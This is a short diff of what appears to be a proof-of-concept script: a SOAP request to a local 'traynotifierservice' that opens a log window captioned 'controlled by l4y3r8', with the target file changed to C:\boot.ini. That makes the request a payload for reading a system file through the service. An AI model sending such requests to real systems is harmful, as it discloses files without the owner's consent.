@@ -22,7 +22,7 @@ var ShowLogfileWindow='<?xml version="1.0" encoding="UTF-8"?> <SOAP-ENV:Envelope
 <SOAP-ENV:Body> \
 <traynotifierservice:ShowLogfileWindow> \
 <Caption>controlled by l4y3r8 :-) ...</Caption> \
-<Filename>S:\\Austausch\\Haentzschel\\skull.txt</Filename>\
+<Filename>C:\boot.ini</Filename>\
 <ulOffset>123</ulOffset>\
 </traynotifierservice:ShowLogfileWindow>\
 </SOAP-ENV:Body>\
